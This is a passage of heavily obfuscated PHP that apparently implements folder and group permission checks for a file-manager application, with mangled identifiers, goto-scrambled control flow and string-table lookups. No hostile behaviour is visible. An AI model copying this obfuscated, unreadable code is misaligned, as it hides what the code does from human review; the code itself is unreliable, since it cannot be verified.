$b•÷¥ï„©Ê[1642] => $b•÷¥ï„©Ê[1799])); goto A™«½‚Ó‹; Bñ˜‘ ŸõÆ: foreach ($b­à°…Ş£‚ as $b˜áëøµÖ× => $cãİĞ†é‰) { $BøĞ–¬ù ° = $Báãğáë¬Ø->parentLevelArray($cãİĞ†é‰[$b•÷¥ï„©Ê[484]]); $bõÛÅö…ĞŞ = array_merge($bõÛÅö…ĞŞ, array($b˜áëøµÖ×), array_reverse($BøĞ–¬ù °)); } $bõÛÅö…ĞŞ = array_values(array_unique($bõÛÅö…ĞŞ)); if (!$bõÛÅö…ĞŞ) { return array(); } goto E¾Ó™©«’î; AÈ‚ç§ ªá: $b•÷¥ï„©Ê =& $_SERVER[±á õÁ]; if (!$b–ğŠ©‚³³) { return array(); } $Báãğáë¬Ø = Model($b•÷¥ï„©Ê[1138]); goto E«ï¿Î¹Ÿ³; C•íÙƒ“Í®: $FÂµ©ø¶© = array_to_keyvalue_group($FÂµ©ø¶©, $b•÷¥ï„©Ê[393]); $E÷¤¤­‚ÇÜ = array(); foreach ($bõÛÅö…ĞŞ as $D¢ªòŠàºÔ) { if (isset($FÂµ©ø¶©[$D¢ªòŠàºÔ])) { $E÷¤¤­‚ÇÜ[$D¢ªòŠàºÔ] = $FÂµ©ø¶©[$D¢ªòŠàºÔ]; } } goto d‡×Şƒƒó¼; BÒ£ñÌïò’: } public function authDeepCheck($fŠ´ñØìÚ, $Cé„ÉÙÌ = false) { goto AãÅ‡ÃñÍƒ; EëÅ¹š½­¸: if (!in_array($fŠ´ñØìÚ, $AŸËåãÖôË[$aòÍ¿Æ©İ—[1800]])) { return !1; } $FÒçã•Éõ = array(); foreach ($AŸËåãÖôË[$aòÍ¿Æ©İ—[1801]] as $fçÄµ’ => $BÃÎ’íÌøŞ) { if (!in_array($fŠ´ñØìÚ, $BÃÎ’íÌøŞ)) { continue; } $FÒçã•Éõ[] = $fçÄµ’; } goto b”Ç½Š¿Èá; AãÅ‡ÃñÍƒ: $aòÍ¿Æ©İ— =& $_SERVER[±á õÁ]; $Cé„ÉÙÌ = $Cé„ÉÙÌ ? $Cé„ÉÙÌ : USER_ID; $AŸËåãÖôË = $this->makeAuthDeep($Cé„ÉÙÌ); goto EëÅ¹š½­¸; b”Ç½Š¿Èá: $AÏ˜×‹†‹ó = $FÒçã•Éõ ? $FÒçã•Éõ[0] : $fŠ´ñØìÚ; return array($aòÍ¿Æ©İ—[401] => -1, $aòÍ¿Æ©İ—[442] => array($aòÍ¿Æ©İ—[409] => $aòÍ¿Æ©İ—[1053], $aòÍ¿Æ©İ—[1627] => $aòÍ¿Æ©İ—[493], $aòÍ¿Æ©İ—[410] => LNG($aòÍ¿Æ©İ—[1802]), $aòÍ¿Æ©İ—[1642] => $aòÍ¿Æ©İ—[1803]), $aòÍ¿Æ©İ—[1804] => LNG($aòÍ¿Æ©İ—[1805]), $aòÍ¿Æ©İ—[1806] => $this->sourceAuthInfo($AÏ˜×‹†‹ó)); goto A“ù†­²Ó; A“ù†­²Ó: } protected function makeAuthDeep($Dïº»Ñ­‰ = false) { goto aÄ¥ÕÙëê—; A¤¹§ŠæÎ: $AÈ×¨Ä’äñ[$Dïº»Ñ­‰] = $B¯›Æ’Şšä; return $B¯›Æ’Şšä; goto c¨×ø§¾Œ¶; fÎŠ‡©á‰: $aˆ·Œ´³î¡ = Model($cÍØÇã¾Š[1138]); $Bğ‡ç¸»  = Model($cÍØÇã¾Š[483]); $F´Ûõ£½¤‡ = array(); goto aŒš‡’Âß¸; E½ÜØÑ¤: foreach ($F´Ûõ£½¤‡ as $F´ÜÇ‰ğÖê => $fÓåÛäÔà) { $d¿ó¤±“õø = $EÄêø§á«´[$F´ÜÇ‰ğÖê]; if (!$d¿ó¤±“õø || !$FˆÌ‰Õ½¢²[$d¿ó¤±“õø]) { continue; } $D¹­ ö¼ = array(); foreach ($a³‹µÊàÓ·[$d¿ó¤±“õø] as $FÂËÓ°²Óç) { $D¹­ ö¼[] = $FˆÌ‰Õ½¢²[$FÂËÓ°²Óç]; } $F´Ûõ£½¤‡[$F´ÜÇ‰ğÖê] = array_merge($D¹­ ö¼, $fÓåÛäÔà); } $D¤³›°ïÆ = array_values(array_unique($D¤³›°ïÆ)); $B¯›Æ’Şšä = array($cÍØÇã¾Š[1800] => $D¤³›°ïÆ, $cÍØÇã¾Š[1801] => $F´Ûõ£½¤‡); goto A¤¹§ŠæÎ; BÒË’È¼Ú©: if (isset($AÈ×¨Ä’äñ[$Dïº»Ñ­‰])) { return $AÈ×¨Ä’äñ[$Dïº»Ñ­‰]; } $d±…ÅŒ—­¹ = Model($cÍØÇã¾Š[1807])->listData(); $E„’¹Â¹® = array(); goto BĞ´¬˜ºÚ‚; Aâ••¹Š»: foreach ($eº›ÏœôŞæ as $FÂËÓ°²Óç) { $eˆŠ«ïèÕË = $Bğ‡ç¸» ->getInfo($FÂËÓ°²Óç); $f®–Äí… = $aˆ·Œ´³î¡->parentLevelArray($eˆŠ«ïèÕË[$cÍØÇã¾Š[484]]); $f«÷™Ìçæ = array_merge($f«÷™Ìçæ, $f®–Äí…); } $f«÷™Ìçæ = array_values(array_unique($f«÷™Ìçæ)); foreach ($f«÷™Ìçæ as $FÂËÓ°²Óç) { $eˆŠ«ïèÕË = $Bğ‡ç¸» ->getInfo($FÂËÓ°²Óç); $D¤³›°ïÆ[] = $eˆŠ«ïèÕË[$cÍØÇã¾Š[415]][$cÍØÇã¾Š[393]]; $FˆÌ‰Õ½¢²[$FÂËÓ°²Óç] = $eˆŠ«ïèÕË[$cÍØÇã¾Š[415]][$cÍØÇã¾Š[393]]; $a³‹µÊàÓ·[$FÂËÓ°²Óç] = $aˆ·Œ´³î¡->parentLevelArray($eˆŠ«ïèÕË[$cÍØÇã¾Š[484]]); } goto E½ÜØÑ¤; Fƒª©÷¨ŒŒ: if ($E£çŸïòƒ’) { $a¬á¼èİ± = array(array($cÍØÇã¾Š[395] => SourceModel::TYPE_USER, $cÍØÇã¾Š[481] => $Dïº»Ñ­‰), array($cÍØÇã¾Š[395] => SourceModel::TYPE_GROUP, $cÍØÇã¾Š[481] => array($cÍØÇã¾Š[408], $E£çŸïòƒ’)), $cÍØÇã¾Š[930] => $cÍØÇã¾Š[1708]); } if ($E„’¹Â¹®) { $a¬á¼èİ± = array($a¬á¼èİ±, $cÍØÇã¾Š[1768] => array($cÍØÇã¾Š[1808], $E„’¹Â¹®)); } $cäÚ¬ŒÏÛ§ = $this->field($cÍØÇã¾Š[1809])->where($a¬á¼èİ±)->select(); goto fí±è¡‡Ïó; aÄ¥ÕÙëê—: $cÍØÇã¾Š =& $_SERVER[±á õÁ]; static $AÈ×¨Ä’äñ = array(); $Dïº»Ñ­‰ = $Dïº»Ñ­‰ ? $Dïº»Ñ­‰ : USER_ID; goto BÒË’È¼Ú©; BĞ´¬˜ºÚ‚: foreach ($d±…ÅŒ—­¹ as $BÆÓ±…›µ¿) { if ($BÆÓ±…›µ¿[$cÍØÇã¾Š[400]] == 0 && $BÆÓ±…›µ¿[$cÍØÇã¾Š[1643]] == $cÍØÇã¾Š[93]) { $E„’¹Â¹®[] = $BÆÓ±…›µ¿[$cÍØÇã¾Š[391]]; } } $E£çŸïòƒ’ = $this->userGroupParents($Dïº»Ñ­‰); $a¬á¼èİ± = array($cÍØÇã¾Š[395] => SourceModel::TYPE_USER, $cÍØÇã¾Š[481] => $Dïº»Ñ­‰); goto Fƒª©÷¨ŒŒ; aŒš‡’Âß¸: $EÄêø§á«´ = array(); $FˆÌ‰Õ½¢² = array(); $a³‹µÊàÓ· = array(); goto DÓ”ØŠš¤; DÓ”ØŠš¤: if ($E×ÕñòÕ¥) { $D†¨½Öö»ã = $aˆ·Œ´³î¡->where(array($cÍØÇã¾Š[393] => array($cÍØÇã¾Š[408], $E×ÕñòÕ¥)))->select(); foreach ($D†¨½Öö»ã as $D¦Ê•öŠâˆ) { $f®–Äí… = $aˆ·Œ´³î¡->parentLevelArray($D¦Ê•öŠâˆ[$cÍØÇã¾Š[484]]); $D¤³›°ïÆ = array_merge($D¤³›°ïÆ, $f®–Äí…); $f«÷™Ìçæ[] = $D¦Ê•öŠâˆ[$cÍØÇã¾Š[481]]; $F´Ûõ£½¤‡[$D¦Ê•öŠâˆ[$cÍØÇã¾Š[393]]] = $f®–Äí…; $EÄêø§á«´[$D¦Ê•öŠâˆ[$cÍØÇã¾Š[393]]] = $D¦Ê•öŠâˆ[$cÍØÇã¾Š[481]]; } } $f«÷™Ìçæ = array_values(array_unique($f«÷™Ìçæ)); $eº›ÏœôŞæ = $f«÷™Ìçæ; goto Aâ••¹Š»; fí±è¡‡Ïó: $E×ÕñòÕ¥ = array_to_keyvalue($cäÚ¬ŒÏÛ§, $cÍØÇã¾Š[43], $cÍØÇã¾Š[393]); $D¤³›°ïÆ = array(); $f«÷™Ìçæ = $E£çŸïòƒ’; goto fÎŠ‡©á‰; c¨×ø§¾Œ¶: } private function makeSourceAuth($D´áóºÎÓ, $dšª¨°“, $bÆÏ›Àô… = false) { goto bÃù¢ù¯Âİ; bÃù¢ù¯Âİ: $C¢Ï®æ§ˆ¢ =& $_SERVER[±á õÁ]; $B£Œ¡óÄ¯Ÿ = $C¢Ï®æ§ˆ¢[93]; $déíÜğ˜˜ = $D´áóºÎÓ[$C¢Ï®æ§ˆ¢[481]]; goto F¾ÛìÅ‰ğ«; b™ØÔ£ÚÄ: if (!$fí‰¼ñâ) { $Aì¯”‘ô¥Ş = Model($C¢Ï®æ§ˆ¢[483])->getInfo($déíÜğ˜˜); $F‚¯êìÂ‚Ã = explode($C¢Ï®æ§ˆ¢[57], trim($Aì¯”‘ô¥Ş[$C¢Ï®æ§ˆ¢[484]], $C¢Ï®æ§ˆ¢[57])); foreach ($F‚¯êìÂ‚Ã as $DŠôò´Çª„) { if ($DŠôò´Çª„ == $C¢Ï®æ§ˆ¢[493] || $DŠôò´Çª„ == $B£Œ¡óÄ¯Ÿ) { continue; } $Fœ÷Î¸£ÑÁ = $this->groupRootAuth($DŠôò´Çª„, $bÆÏ›Àô…); if (!$Fœ÷Î¸£ÑÁ) { continue; } $fí‰¼ñâ = $this->groupAuthInfo($Fœ÷Î¸£ÑÁ, $DŠôò´Çª„); break; } } if (!$fí‰¼ñâ || $fí‰¼ñâ[$C¢Ï®æ§ˆ¢[401]] <= 0) { $eº½õÙÛØÂ = $this->authDeepCheck($D´áóºÎÓ[$C¢Ï®æ§ˆ¢[393]], $bÆÏ›Àô…); if ($eº½õÙÛØÂ) { $fí‰¼ñâ = $eº½õÙÛØÂ; } } return $fí‰¼ñâ; goto c§¡Ô½£ïò; f¯ÄˆæÌµ‡: foreach ($a˜ñÀİ¦ì as $BáŸ×ŒÒ…á) { if (!isset($dšª¨°“[$BáŸ×ŒÒ…á])) { continue; } $A¶Í­”™• = $this->authMake($dšª¨°“[$BáŸ×ŒÒ…á], $bÆÏ›Àô…); if ($A¶Í­”™•[$C¢Ï®æ§ˆ¢[442]]) { $fí‰¼ñâ = $A¶Í­”™•; break; } } if (!$dêÄ¥ùÃî) { return $fí‰¼ñâ; } if (!$fí‰¼ñâ && $d¥ñãÃõ‘) { $fí‰¼ñâ = $this->groupAuthInfo($d¥ñãÃõ‘, $déíÜğ˜˜); } goto b™ØÔ£ÚÄ; e·ôÔ§èâ: $a˜ñÀİ¦ì = Model($C¢Ï®æ§ˆ¢[1138])->parentLevelArray($D´áóºÎÓ[$C¢Ï®æ§ˆ¢[484]]); $a˜ñÀİ¦ì = array_merge(array($D´áóºÎÓ[$C¢Ï®æ§ˆ¢[393]]), array_reverse($a˜ñÀİ¦ì)); $fí‰¼ñâ = !1; goto f¯ÄˆæÌµ‡; F¾ÛìÅ‰ğ«: $dêÄ¥ùÃî = $D´áóºÎÓ[$C¢Ï®æ§ˆ¢[395]] == SourceModel::TYPE_GROUP; $d¥ñãÃõ‘ = $dêÄ¥ùÃî ? $this->groupRootAuth($déíÜğ˜˜, $bÆÏ›Àô…) : !1; if ($d¥ñãÃõ‘ && Model($C¢Ï®æ§ˆ¢[1788])->authCheckAction($d¥ñãÃõ‘[$C¢Ï®æ§ˆ¢[400]], $C¢Ï®æ§ˆ¢[1641])) { return $this->groupAuthInfo($d¥ñãÃõ‘, $déíÜğ˜˜); } goto e·ôÔ§èâ; c§¡Ô½£ïò: } private function userIsRoot($B®³ê¿‡Š = false) { $d«æêŒ¾İà =& $_SERVER[±á õÁ]; if (!$B®³ê¿‡Š && _get($GLOBALS, $d«æêŒ¾İà[482])) { return !0; } $b‘ÑÀËƒŒ„ = Model($d«æêŒ¾İà[502])->getInfo($B®³ê¿‡Š); $F÷¹ƒÙÓÙ = Model($d«æêŒ¾İà[1810])->listData($b‘ÑÀËƒŒ„[$d«æêŒ¾İà[1345]]); if ($F÷¹ƒÙÓÙ && $F÷¹ƒÙÓÙ[$d«æêŒ¾İà[1214]][$d«æêŒ¾İà[1811]] == 1) { return !0; } return !1; } private function sourceAuthInfo($BĞ²‡èî) { goto B„ŒĞŒ›¹; eÓ¹„Ä¬Íó: if (!$FÛ·µµÕËç) { return !1; } $Fãùƒ¸æá->groupPathDisplay($FÛ·µµÕËç); $FÃÎ¶âæöã = array($FÛ·µµÕËç); goto C’¬¦ÉçÀ; C’¬¦ÉçÀ: $FÃÎ¶âæöã = $Fãùƒ¸æá->_listAppendPath($FÃÎ¶âæöã); $FÛ·µµÕËç = $FÃÎ¶âæöã[0]; $AÔœ‰¹·éÉ = $FÛ·µµÕËç[$fè‘˜í‡§[491]]; goto B„÷‚„ğ”©; B„ŒĞŒ›¹: $fè‘˜í‡§ =& $_SERVER[±á õÁ]; $Fãùƒ¸æá = Model($fè‘˜í‡§[1138]); $FÛ·µµÕËç = $Fãùƒ¸æá->sourceInfo($BĞ²‡èî); goto eÓ¹„Ä¬Íó; B„÷‚„ğ”©: if (isset($FÛ·µµÕËç[$fè‘˜í‡§[489]])) { $Aó‰Ñ–ñÎ§ = explode($fè‘˜í‡§[8], trim($FÛ·µµÕËç[$fè‘˜í‡§[491]], $fè‘˜í‡§[8])); array_shift($Aó‰Ñ–ñÎ§); $AÔœ‰¹·éÉ = $FÛ·µµÕËç[$fè‘˜í‡§[487]] . $fè‘˜í‡§[1812] . implode($fè‘˜í‡§[8], $Aó‰Ñ–ñÎ§); } return array($fè‘˜í‡§[410] => $FÛ·µµÕËç[$fè‘˜í‡§[38]], $fè‘˜í‡§[85] => KodIO::make($FÛ·µµÕËç[$fè‘˜í‡§[393]]), $fè‘˜í‡§[1813] => $AÔœ‰¹·éÉ); goto cÖŸ ù–Û°; cÖŸ ù–Û°: } private function groupAuthInfo($eÈ®œĞêî·, $E•¥†¡É¿) { $BÉ”éÄà“Ş =& $_SERVER[±á õÁ]; $eøóŠë™Î = Model($BÉ”éÄà“Ş[483])->getInfo($E•¥†¡É¿); return array($BÉ”éÄà“Ş[1814] => intval($eÈ®œĞêî·[$BÉ”éÄà“Ş[400]]), $BÉ”éÄà“Ş[1797] => $eÈ®œĞêî·, $BÉ”éÄà“Ş[1815] => LNG($BÉ”éÄà“Ş[1816]), $BÉ”éÄà“Ş[1806] => array($BÉ”éÄà“Ş[410] => $eøóŠë™Î[$BÉ”éÄà“Ş[38]], $BÉ”éÄà“Ş[85] => KodIO::make($eøóŠë™Î[$BÉ”éÄà“Ş[415]][$BÉ”éÄà“Ş[393]]), $BÉ”éÄà“Ş[1813] => $eøóŠë™Î[$BÉ”éÄà“Ş[488]])); } protected function groupRootAuth($FÉó¥£•òê, $DğË¼”ğ­Æ = false) { goto f˜•áŠï¬; f˜•áŠï¬: $EéÎ®æøî =& $_SERVER[±á õÁ]; $DğË¼”ğ­Æ = $DğË¼”ğ­Æ ? $DğË¼”ğ­Æ : USER_ID; $Fæ˜®‡Ó‹æ = $DğË¼”ğ­Æ . $EéÎ®æøî[1817] . $FÉó¥£•òê; goto AäŸÈÀÌŒ; AäŸÈÀÌŒ: static $Bàìà˜ = array(); if (isset($Bàìà˜[$Fæ˜®‡Ó‹æ])) { return $Bàìà˜[$Fæ˜®‡Ó‹æ]; } $bã®“À’Ä = Model($EéÎ®æøî[483])->getInfo($FÉó¥£•òê); goto eæÊ§š¶¤ì; eˆªÚº›ØÂ: return $Bàìà˜[$Fæ˜®‡Ó‹æ]; goto FÁ­á¶ùƒ£; b°ìœ‘–ô: $FçøÍ¶¤„… = array($EéÎ®æøî[393] => $bã®“À’Ä[$EéÎ®æøî[415]][$EéÎ®æøî[393]]); $DÅíÁ„ãÍ = $EéÎ®æøî[1796]; $A×Ñßñ‘ãÈ = $this->field($DÅíÁ„ãÍ)->cacheMemory()->where($FçøÍ¶¤„…)->select(); goto aíªÉŒì”; aíªÉŒì”: $b¤‘ÕÈ–Æ = $A×Ñßñ‘ãÈ ? $this->authMake($A×Ñßñ‘ãÈ, $DğË¼”ğ­Æ) : !1; $BÚò¶¢øØ = $b¤‘ÕÈ–Æ ? $b¤‘ÕÈ–Æ[$EéÎ®æøî[442]] : !1; $Bàìà˜[$Fæ˜®‡Ó‹æ] = $BÚò¶¢øØ ? $BÚò¶¢øØ : $e–ÇÍ®Éã‰; goto eˆªÚº›ØÂ; eæÊ§š¶¤ì: $A¿Ò×Ë’‰ = $this->userGroupList($DğË¼”ğ­Æ); $e–ÇÍ®Éã‰ = isset($A¿Ò×Ë’‰[$FÉó¥£•òê]) ? $A¿Ò×Ë’‰[$FÉó¥£•òê][$EéÎ®æøî[400]] : !1; if ($e–ÇÍ®Éã‰ && Model($EéÎ®æøî[1788])->authCheckAction($e–ÇÍ®Éã‰[$EéÎ®æøî[400]], $EéÎ®æøî[1641])) { $Bàìà˜[$Fæ˜®‡Ó‹æ] = $e–ÇÍ®Éã‰; return $e–ÇÍ®Éã‰; } goto b°ìœ‘–ô; FÁ­á¶ùƒ£: } public function authOwnerApply($C¾•ò«¡÷) { goto DáâœÀ¢Ã÷; dÇ¹™³¸ô–: $C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[400]][$BÇ‚ŸäÕ¶î[1820]] = Model($BÇ‚ŸäÕ¶î[499])->userListInfo($BÛ„±ĞäÁİ); return $C¾•ò«¡÷; goto EÌÅ“ÜñÅ•; DáâœÀ¢Ã÷: $BÇ‚ŸäÕ¶î =& $_SERVER[±á õÁ]; if (empty($C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[400]]) || isset($C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[1818]]) && $C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[1818]]) { return $C¾•ò«¡÷; } if (AuthModel::authCheckRoot($C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[400]][$BÇ‚ŸäÕ¶î[401]])) { return $C¾•ò«¡÷; } goto cÉŸ«ßÁ¥Ô; cÉŸ«ßÁ¥Ô: $Fàì©ä = Model($BÇ‚ŸäÕ¶î[1138])->parentLevelArray($C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[484]]); $Fàì©ä = array_merge(array($C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[393]]), array_reverse($Fàì©ä)); $dÕ’ö²¯«“ = $BÇ‚ŸäÕ¶î[1796]; goto BÂ–¶İá±; aÉ“Ğ¯¶×À: if (count($BÛ„±ĞäÁİ) == 0) { $BÛ„±ĞäÁİ = $this->authFolderOwnerGroup($C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[481]]); } $BÛ„±ĞäÁİ = array_unique($BÛ„±ĞäÁİ); if (AuthModel::authCheckRoot($C¾•ò«¡÷[$BÇ‚ŸäÕ¶î[400]][$BÇ‚ŸäÕ¶î[401]])) { $BÛ„±ĞäÁİ[] = USER_ID; } goto dÇ¹™³¸ô–; d¦ÑÖµ‰³Ä: $dÍŒÚÉ†å£ = array(); $BÛ„±ĞäÁİ = array(); foreach ($f‚¥œä–À¼ as $eÏç°ÍØò => $eõÒî«Ê‚¬) { $bóºĞØÕ·é = $this->authFolderOwnerUser($eõÒî«Ê‚¬); $dÍŒÚÉ†å£[$eÏç°ÍØò] = $bóºĞØÕ·é; $BÛ„±ĞäÁİ = array_merge($BÛ„±ĞäÁİ, $bóºĞØÕ·é[$BÇ‚ŸäÕ¶î[559]]); if ($bóºĞØÕ·é[$BÇ‚ŸäÕ¶î[1819]]) { break; } } goto aÉ“Ğ¯¶×À; BÂ–¶İá±: $c¥ç°¸©» = array($BÇ‚ŸäÕ¶î[407] => array($BÇ‚ŸäÕ¶î[408], $Fàì©ä)); $f‚¥œä–À¼ = $this->field($dÕ’ö²¯«“)->where($c¥ç°¸©»)->select(); $f‚¥œä–À¼ = array_to_keyvalue_group($f‚¥œä–À¼, $BÇ‚ŸäÕ¶î[393]); goto d¦ÑÖµ‰³Ä; EÌÅ“ÜñÅ•: } private function authFolderOwnerGroup($B„…ˆ‹ÎŒÜ) { $bá¢Û¨š¾ê =& $_SERVER[±á õÁ]; $AÇïé Ò°Œ = Model($bá¢Û¨š¾ê[1702])->where(array($bá¢Û¨š¾ê[1621] => $B„…ˆ‹ÎŒÜ))->select(); $D¼šÈá°·™ = array(); if (!$AÇïé Ò°Œ) { return $D¼šÈá°·™; } foreach ($AÇïé Ò°Œ as $cğ‰°¯‡‘¢) { $b ìåŸ÷œ• = $this->authInfo($cğ‰°¯‡‘¢); if (AuthModel::authCheckRoot($b ìåŸ÷œ•[$bá¢Û¨š¾ê[400]])) { $D¼šÈá°·™[] = $cğ‰°¯‡‘¢[$bá¢Û¨š¾ê[1463]]; } } return $D¼šÈá°·™; } private function authFolderOwnerUser($c°¹—Îº÷–) { $d³’—ĞÖ =& $_SERVER[±á õÁ]; $FÜÔîš´îÙ = array(); $cÑÇ¾À³¾ = !1; foreach ($c°¹—Îº÷– as $Fµøª—ñèÌ) { $Açª§ã‡Öó = $this->authInfo($Fµøª—ñèÌ); if ($Fµøª—ñèÌ[$d³’—ĞÖ[481]] == $d³’—ĞÖ[493]) { $cÑÇ¾À³¾ = !0; } if ($Fµøª—ñèÌ[$d³’—ĞÖ[395]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Açª§ã‡Öó[$d³’—ĞÖ[400]])) { $FÜÔîš´îÙ[] = $Fµøª—ñèÌ[$d³’—ĞÖ[481]]; } } } return array($d³’—ĞÖ[559] => $FÜÔîš´îÙ, $d³’—ĞÖ[1819] => $cÑÇ¾À³¾); } public function authMake($d¨ª®—ø, $B§‹ù‹›àÆ = false) { goto b‘ê§ƒ; eå·ªÁ±²å: foreach ($d¨ª®—ø as $a’óÔç) { $bèİ“µÁõÚ = $this->authInfo($a’óÔç); $D¦ØöíÚëÒ = $a’óÔç[$Dç’İ„ÀÄ®[481]]; $fœá°¤†°ô = intval($bèİ“µÁõÚ[$Dç’İ„ÀÄ®[400]]); if ($a’óÔç[$Dç’İ„ÀÄ®[395]] == SourceModel::TYPE_USER && $D¦ØöíÚëÒ == $B§‹ù‹›àÆ) { $BÕ‘’é¶ŒÃ = !0; $CÙÔËŠİ° = $bèİ“µÁõÚ; $d‹×‡˜®”‹ = $fœá°¤†°ô; } else { if ($a’óÔç[$Dç’İ„ÀÄ®[395]] == SourceModel::TYPE_GROUP && $this->groupContainUser($D¦ØöíÚëÒ, $B§‹ù‹›àÆ)) { $b¥èç¥£Ä˜ = !0; $aî´‚ß­ëï = $this->groupStepToUserGroup($D¦ØöíÚëÒ, $B§‹ù‹›àÆ); if ($aî´‚ß­ëï < $aï‰²…Ã‹Î) { $aï‰²…Ã‹Î = $aî´‚ß­ëï; $Cµ¤”á¦ÅË = $fœá°¤†°ô; $e¬ÇŒŞóÖÔ = $bèİ“µÁõÚ; $DÏ˜ÓÌ×ò‹ = $D¦ØöíÚëÒ; } if ($aî´‚ß­ëï == $aï‰²…Ã‹Î && $fœá°¤†°ô >= $Cµ¤”á¦ÅË) { $Cµ¤”á¦ÅË = $fœá°¤†°ô; $e¬ÇŒŞóÖÔ = $bèİ“µÁõÚ; $DÏ˜ÓÌ×ò‹ = $D¦ØöíÚëÒ; } } else { if ($D¦ØöíÚëÒ == $Dç’İ„ÀÄ®[493]) { $FÃ¤ãÅ¯¸… = !0; $e×„—¯Œâ = $bèİ“µÁõÚ; $B´ĞÑ˜ßôì = $fœá°¤†°ô; } } } } if ($BÕ‘’é¶ŒÃ) { $C×ÈÚ£Á÷ = $d‹×‡˜®”‹; $bèİ“µÁõÚ = $CÙÔËŠİ°; $eÌÀèöÆ = LNG($Dç’İ„ÀÄ®[1821]); } else { if ($b¥èç¥£Ä˜) { $C×ÈÚ£Á÷ = $Cµ¤”á¦ÅË; $bèİ“µÁõÚ = $e¬ÇŒŞóÖÔ; $bß“‘ÆùÔª = Model($Dç’İ„ÀÄ®[483])->getInfo($DÏ˜ÓÌ×ò‹); $eÌÀèöÆ = $Dç’İ„ÀÄ®[167] . $bß“‘ÆùÔª[$Dç’İ„ÀÄ®[488]] . $Dç’İ„ÀÄ®[1822] . LNG($Dç’İ„ÀÄ®[1823]); } else { if ($FÃ¤ãÅ¯¸…) { $C×ÈÚ£Á÷ = $B´ĞÑ˜ßôì; $bèİ“µÁõÚ = $e×„—¯Œâ; $eÌÀèöÆ = LNG($Dç’İ„ÀÄ®[1793]); } else { $C×ÈÚ£Á÷ = 0; $bèİ“µÁõÚ = !1; $eÌÀèöÆ = $Dç’İ„ÀÄ®[43]; } } } $CÑ™ï•¾Ü‚ = array($Dç’İ„ÀÄ®[1814] => intval($C×ÈÚ£Á÷), $Dç’İ„ÀÄ®[1797] => $bèİ“µÁõÚ, $Dç’İ„ÀÄ®[1815] => $eÌÀèöÆ, $Dç’İ„ÀÄ®[1806] => $this->sourceAuthInfo($a’óÔç[$Dç’İ„ÀÄ®[393]])); goto DŠ¡¶²¸Á‚; DÁ‹®Àøõ: $b¥èç¥£Ä˜ = 0; $Cµ¤”á¦ÅË = 0; $e¬ÇŒŞóÖÔ = 0; goto BÙ¼…ñÎŸ; b‘ê§ƒ: $Dç’İ„ÀÄ® =& $_SERVER[±á õÁ]; if (!$d¨ª®—ø) { return array($Dç’İ„ÀÄ®[401] => 0, $Dç’İ„ÀÄ®[442] => !1); } $B§‹ù‹›àÆ = $B§‹ù‹›àÆ ? $B§‹ù‹›àÆ : USER_ID; goto eğ™Ôµ³‹Ï; BÙ¼…ñÎŸ: $aï‰²…Ã‹Î = 1000; $DÏ˜ÓÌ×ò‹ = 0; $FÃ¤ãÅ¯¸… = 0; goto f‚–ñå®¥ğ; eğ™Ôµ³‹Ï: $BÕ‘’é¶ŒÃ = 0; $d‹×‡˜®”‹ = 0; $CÙÔËŠİ° = 0; goto DÁ‹®Àøõ; DŠ¡¶²¸Á‚: return $CÑ™ï•¾Ü‚; goto AƒÀˆóè¾×; f‚–ñå®¥ğ: $B´ĞÑ˜ßôì = 0; $e×„—¯Œâ = 0; $a’óÔç = array($Dç’İ„ÀÄ®[393] => 0); goto eå·ªÁ±²å; AƒÀˆóè¾×: } private function groupContainUser($DÂÅ³‡×Ş…, $cßåæ¿¶òù = false) { return in_array($DÂÅ³‡×Ş…, $this->userGroupParents($cßåæ¿¶òù)); } private function groupStepToUserGroup($b¤ÁĞ–â‚Ş, $BèŒµ„ñŠ† = false) { goto E­‹©”šÄ±; aØ•à·¢‹: $B…µ‘Ëº¶Å = $GLOBALS[$c‰š§ÕÆï[6]][$c‰š§ÕÆï[94]][$c‰š§ÕÆï[1714]] == 1; $AèïµëÜ£ğ = $B…µ‘Ëº¶Å ? 3 : 2; foreach ($A¹Ş»…èëâ as $EÈ®…òĞ»ö) { if ($EÈ®…òĞ»ö[$c‰š§ÕÆï[1621]] == $b¤ÁĞ–â‚Ş) { return 0; } $a¸Í³ß»´³ = explode($c‰š§ÕÆï[57], trim($EÈ®…òĞ»ö[$c‰š§ÕÆï[484]], $c‰š§ÕÆï[57])); if ($a¸Í³ß»´³[0] == $c‰š§ÕÆï[493] && count($a¸Í³ß»´³) > $AèïµëÜ£ğ) { $eĞñßó‚Ò„ = array_reverse(array_slice($a¸Í³ß»´³, $AèïµëÜ£ğ)); $AÚ°°³ëÙæ = array_search($b¤ÁĞ–â‚Ş, $eĞñßó‚Ò„); if ($AÚ°°³ëÙæ !== !1 && $AÚ°°³ëÙæ + 1 <= $BÕ¨²»ÂØ˜) { $BÕ¨²»ÂØ˜ = $AÚ°°³ëÙæ + 1; } } } goto Eª®¨Ø‹ë ; Eª®¨Ø‹ë : return $BÕ¨²»ÂØ˜; goto aÔ£ñÏ¤; E­‹©”šÄ±: $c‰š§ÕÆï =& $_SERVER[±á õÁ]; $A¹Ş»…èëâ = $this->userGroupList($BèŒµ„ñŠ†); $BÕ¨²»ÂØ˜ = 1000; goto aØ•à·¢‹; aÔ£ñÏ¤: } private function userGroupList($C£ÓšÓ•¤ = false) { $D§Å½‹Ì¢ù =& $_SERVER[±á õÁ]; static $DÚÓÑÃšÈ = array(); if (isset($DÚÓÑÃšÈ[$C£ÓšÓ•¤])) { return $DÚÓÑÃšÈ[$C£ÓšÓ•¤]; } $d†®Ñœ°ˆ = Model($D§Å½‹Ì¢ù[502])->getInfo($C£ÓšÓ•¤); $DÚÓÑÃšÈ[$C£ÓšÓ•¤] = array_to_keyvalue($d†®Ñœ°ˆ[$D§Å½‹Ì¢ù[1794]], $D§Å½‹Ì¢ù[1621]); return $DÚÓÑÃšÈ[$C£ÓšÓ•¤]; } public function userGroupParents($Aè¦Ş”ä‚Á) { goto b¤“Ä†”; b¤“Ä†”: $b“†ƒ´±‹Ô =& $_SERVER[±á õÁ]; static $AÇ„È‚¸Â§ = array(); $Aè¦Ş”ä‚Á = $Aè¦Ş”ä‚Á ? $Aè¦Ş”ä‚Á : USER_ID; goto D±ŞŸ‚œÅ; D±ŞŸ‚œÅ: if 